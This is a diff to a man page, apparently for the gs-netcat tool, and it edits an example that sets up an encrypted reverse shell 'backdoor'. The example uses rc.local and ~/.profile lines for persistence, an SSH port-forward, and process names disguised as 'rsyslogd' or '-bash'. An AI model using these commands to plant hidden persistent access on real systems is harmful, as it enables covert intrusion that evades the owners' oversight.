@@ -141,16 +141,18 @@ The sftp-server binary speaks the sftp-protocol to stdin/stdout. The sftp binary
 .Pp
 .Nm Example 8
 - Encrypted Reverse PTY shell hidden as \'-bash\' in the process list - also known as \'backdoor\':
-.Dl $ export GSOCKET_ARGS=\'-s MySecret -liqD\'
-.Dl $ (exec -a -bash gs-netcat)
+.Dl $ (GSOCKET_ARGS="-s MySecret -liqD" exec -a -bash gs-netcat)
 .Pp
 The following line in /etc/rc.local starts the backdoor after each system reboot:
-.Dl (GSOCKET_ARGS="-s MySecret -liqD" SHELL="/bin/bash" exec -a rsyslogd /usr/local/bin/gs-netcat)
+.Dl GSOCKET_ARGS="-s MySecret -liqD" HOME=/root TERM=xterm-256color SHELL="/bin/bash" /bin/bash -c\ "cd $HOME; exec -a rsyslogd /usr/local/bin/gs-netcat"
+.Pp
+The follwing line in /etc/rc.local starts a port-forward to 127.0.0.1:22:
+.Dl GSOCKET_ARGS="-k MySecret2 -lqD -d 127.1 -p22"  /bin/bash -c\ "exec -a rsyslogd /usr/local/bin/gs-netcat"
 .Pp
 The following line in the user\'s ~/.profile starts the backdoor (once) when the user logs in. All in one line:
-.Dl killall -0 gs-netcat 2>/dev/null || (GSOCKET_ARGS="-s MySecret -liqD" SHELL=/bin/bash exec -a -bash /usr/local/bin/gs-netcat)
+.Dl killall -0 gs-netcat 2>/dev/null || (GSOCKET_ARGS="-s MySecret3 -liqD" SHELL=/bin/bash exec -a -bash /usr/local/bin/gs-netcat)
 .Pp
-The \'(...)\' brackets start a sub-shell which is then replaced (by exec) with the gs-netcat process. The process is hidden (as rsyslogd) from the process list. Set SHELL=/bin/bash to use bash instead of /bin/sh.
+The \'(...)\' brackets start a sub-shell which is then replaced (by exec) with the gs-netcat process. The process is hidden (as -bash) from the process list.
 .Pp
 Client to connect to the backdoor:
 .Dl $ gs-netcat -s MySecret -i
